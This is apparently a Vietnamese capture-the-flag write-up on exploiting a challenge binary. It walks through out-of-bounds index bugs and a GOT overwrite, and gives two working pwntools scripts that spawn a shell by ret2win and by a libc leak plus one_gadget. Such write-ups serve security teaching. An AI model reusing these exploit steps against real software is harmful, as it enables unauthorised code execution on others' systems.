# Phân tích code 

<img width="948" height="578" alt="Screenshot 2026-11-16 134519" src="https://github.com/user-attachments/assets/96abce11-a135-4969-b8aa-adc42f04398a" />

Chương trình cho 3 lựa chọn để tiếp tục là `input_player()` `view()` và `make_noise()`.

<img width="642" height="257" alt="image" src="https://github.com/user-attachments/assets/f616c7ae-7209-41f5-95af-0d688860b83d" />

Đầu tiên là hàm `input_player()` cho phép nhập index để gọi read vào mảng users. Có lỗ hổng *Out of bounds* do không có bước kiểm tra index nhập vào.

<img width="741" height="287" alt="image" src="https://github.com/user-attachments/assets/cb381a8c-9e49-4e5d-945c-db2801b2ad63" />

Hàm `view()` cũng có lỗ hổng *Out of bounds* khi gọi printf trực tiếp với index chưa qua kiểm duyệt.

## Mitigation

<img width="1206" height="335" alt="image" src="https://github.com/user-attachments/assets/52dfd245-9ec9-4195-af90-265149a7408c" />

- Vì RELRO không ở trạng thái FULL RELRO nên ta vẫn có thể ghi đè vào bảng GOT. 
- PIE tắt cho phép dùng trực tiếp địa chỉ binary mà không cần địa chỉ base.

# Khai thác (ret2win)

<img width="890" height="334" alt="image" src="https://github.com/user-attachments/assets/fcf6b3e0-16dc-489a-a41b-1f1fde1fe37d" />

Mảng users nằm ở phân vùng .BSS có quyền `rw-`, nằm chung phân vùng với bảng GOT của chương trình. Có thể ghi đè lên bảng GOT qua hàm `input_player()` khi nhập index âm.

<img width="795" height="337" alt="image" src="https://github.com/user-attachments/assets/544f83a3-7f98-4590-b689-a73c46e630a5" />

Trong chương trình có hàm `win` gọi sẵn `system("/bin/sh")`. chỉ cần ghi đè lên 1 hàm bất kì trong bảng GOT để chuyển hướng tạo shell.

## Scipt python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./vuln_patched',checksec=False)
    libc=ELF('./libc.so.6')
    p=process(exe.path)
    
    p.sendafter(b'First, create a user.',b'zyan')
    
    payload=p64(libc.sym['system'])
    payload+=p64(libc.sym['printf'])
    payload+=p64(libc.sym['memset'])
    payload+=p64(libc.sym['read'])
    payload+=p64(exe.sym['fopen'])
    payload+=p64(libc.sym['perror'])
    payload+=p64(libc.sym['__isoc99_scanf'])
    payload+=p64(exe.sym['win'])                   //ghi đè win lên exit
    
    p.sendlineafter(b'Input your choice:',b'1')    //input_player
    p.sendlineafter(b'id',b'-2')
    p.sendafter(b'name',payload)
    
    p.sendlineafter(b'Input your choice:',b'4')    //exit

# Khai thác (one_gadget)

Đầu tiên leak libc để có được libc.address tính địa chỉ các hàm libc và gadget. Sử dụng hàm `view()` trong chương trình để in ra màn hình dữ liệu nằm trên mảng users. Vì mảng users có kích thước mỗi phần tử là 80 nên leak `__libc_start_main` là khả thi nhất vì từ users đến đó cách 240 BYTES về trước tương ứng với -3*80.

    p.sendafter(b'First, create a user.',b'zyan')
    
    p.sendlineafter(b'Input your choice:',b'2')    //view
    p.sendlineafter(b'Input id to view: ',b'-3')   //index -3
    p.recvuntil(b'Name: ')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29dc0
    print(hex(libc_leak))

Hiện tại đã có libc.address rồi thì có thể ghi đè system vào 1 hàm bất kì bảng GOT. Tuy nhiên, không có hàm nào trong chương trình được sử dụng có sẵn tham số đầu là /bin/sh và cũng không có khả năng ghi đè lên các tham số đó. 

Hướng khai thác còn lại là dùng one_gadget để tạo shell. Cần tìm 1 hàm mà tại đó các điều kiện trên được thỏa và ghi đè one_gadget vào hàm đó trong bảng GOT. 

<img width="1401" height="965" alt="image" src="https://github.com/user-attachments/assets/1f884f5d-4cf5-4b9f-98d6-d1c499a21f43" />

Kiểm tra điều kiện:

<img width="762" height="348" alt="image" src="https://github.com/user-attachments/assets/c05eabd3-0306-4a5d-bd14-b3b4575e3e82" />
<img width="768" height="222" alt="image" src="https://github.com/user-attachments/assets/f466bea7-9a16-46ee-844c-eaff9b02ebb1" />

Chỉ có duy nhất tại hàm `perror` trong `make_noise` là có điều kiện thỏa one_gadget đầu tiên. 

<img width="901" height="476" alt="image" src="https://github.com/user-attachments/assets/428cf6c4-eeef-4ede-a05a-b442897a3490" />

Để tới được hàm perror thì cần phải làm cho biến stream = 0. Muốn stream = 0 thì ta thay hàm `fopen` bằng `perror` vì `perror` luôn trả về NULL. 

Ghi đè vào bảng GOT (các hàm nào không cần ghi đè thì để nguyên hàm cũ để tránh lỗi):

    payload=p64(libc.sym['system'])
    payload+=p64(libc.sym['printf'])
    payload+=p64(libc.sym['system'])
    payload+=p64(libc.sym['read'])
    payload+=p64(libc.sym['perror'])  //thay fopen bằng perror
    payload+=p64(one_gadget)          //thay perror bằng one_gadget
    
    p.sendlineafter(b'Input your choice:',b'1') //input_player
    p.sendlineafter(b'id',b'-2')
    p.sendafter(b'name',payload)
    
    p.sendlineafter(b'Input your choice:',b'3') //make_noise

## Script python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./vuln_patched',checksec=False)
    libc=ELF('./libc.so.6')
    p=process(exe.path)
    
    p.sendafter(b'First, create a user.',b'zyan')
    p.sendlineafter(b'Input your choice:',b'2')
    p.sendlineafter(b'Input id to view: ',b'-3')
    p.recvuntil(b'Name: ')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29dc0
    print(hex(libc_leak))
    
    one_gadget=libc.address+0xebc41
    
    payload=p64(libc.sym['system'])
    payload+=p64(libc.sym['printf'])
    payload+=p64(libc.sym['memset'])
    payload+=p64(libc.sym['read'])
    payload+=p64(libc.sym['perror'])
    payload+=p64(one_gadget)
    
    p.sendlineafter(b'Input your choice:',b'1')
    p.sendlineafter(b'id',b'-2')
    p.sendafter(b'name',payload)
    
    p.sendlineafter(b'Input your choice:',b'3')
    
    p.interactive()
